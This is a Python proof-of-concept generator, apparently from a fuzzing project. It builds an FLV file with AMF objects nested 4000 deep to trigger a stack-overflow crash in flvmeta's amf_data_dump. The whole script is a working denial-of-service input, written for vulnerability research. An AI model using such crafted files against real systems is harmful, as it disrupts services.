#!/usr/bin/env python3
"""
VULN 002 PoC generator: Uncontrolled Recursion in amf_data_dump
CWE-674: Uncontrolled Recursion

Crafts a FLV file with a Script Tag containing deeply nested AMF strict
arrays/objects to trigger stack exhaustion in amf_data_dump() during
the DUMP phase (when flvmeta prints/dumps metadata).
"""

import struct
import os

OUTPUT = "/data/ylwang/non-textfuzz/target/_poc/flvmeta/src_dump_raw_c/vuln_002.flv"
DEPTH = 4000  # Each amf_data_dump frame allocates 128-byte datestr; 4000 levels should overflow

# ---- Build deeply nested AMF structure (iterative, no Python recursion) ----

# Innermost value: AMF number 1.0
inner = b"\x00" + struct.pack(">d", 1.0)

# Wrap in DEPTH levels of AMF objects
# AMF object: 0x03 + key-value pairs + 0x00 0x00 0x09 (end marker)
# Key format: uint16 BE length + bytes (no type byte for key)
# Value format: type byte + data
for i in range(DEPTH):
    key = b"\x00\x01" + b"a"  # key "a", length 1
    inner = b"\x03" + key + inner + b"\x00\x00\x09"

# Outermost "onMetaData" ecma_array wrapping (variation from VULN 001)
# AMF ecma_array: 0x08 + uint32 BE count + key-value pairs + 0x00 0x00 0x09
key_outer = b"\x00\x04" + b"meta"
amf_body = b"\x08" + struct.pack(">I", 1) + key_outer + inner + b"\x00\x00\x09"

# Full AMF data for script tag
# AMF string: 0x02 + uint16 BE length + bytes
amf_name = b"\x02" + struct.pack(">H", 10) + b"onMetaData"
tag_data = amf_name + amf_body

# ---- Assemble FLV file ----

# FLV header: signature + version 1 + flags (audio+video) + header size 9
flv_header = b"FLV" + b"\x01" + b"\x05" + b"\x00\x00\x00\x09"

# Previous tag size before first tag = 0
prev_tag_size_0 = b"\x00\x00\x00\x00"

# Script tag (type 0x12 = 18)
tag_type = b"\x12"
data_size = len(tag_data)
tag_data_size = struct.pack(">I", data_size)[1:]  # 3 bytes BE
timestamp = b"\x00\x00\x00"
timestamp_extended = b"\x00"
stream_id = b"\x00\x00\x00"

script_tag = (
    tag_type
    + tag_data_size
    + timestamp
    + timestamp_extended
    + stream_id
    + tag_data
)

# Previous tag size = 11 (tag header) + data_size
prev_tag_size_1 = struct.pack(">I", 11 + data_size)

flv_bytes = flv_header + prev_tag_size_0 + script_tag + prev_tag_size_1

# ---- Write output ----
os.makedirs(os.path.dirname(OUTPUT), exist_ok=True)
with open(OUTPUT, "wb") as f:
    f.write(flv_bytes)

print(f"[+] Written {len(flv_bytes)} bytes to {OUTPUT}")
print(f"[+] AMF nesting depth: {DEPTH}")
print(f"[+] Expected crash: stack overflow in amf_data_dump() during dump phase")
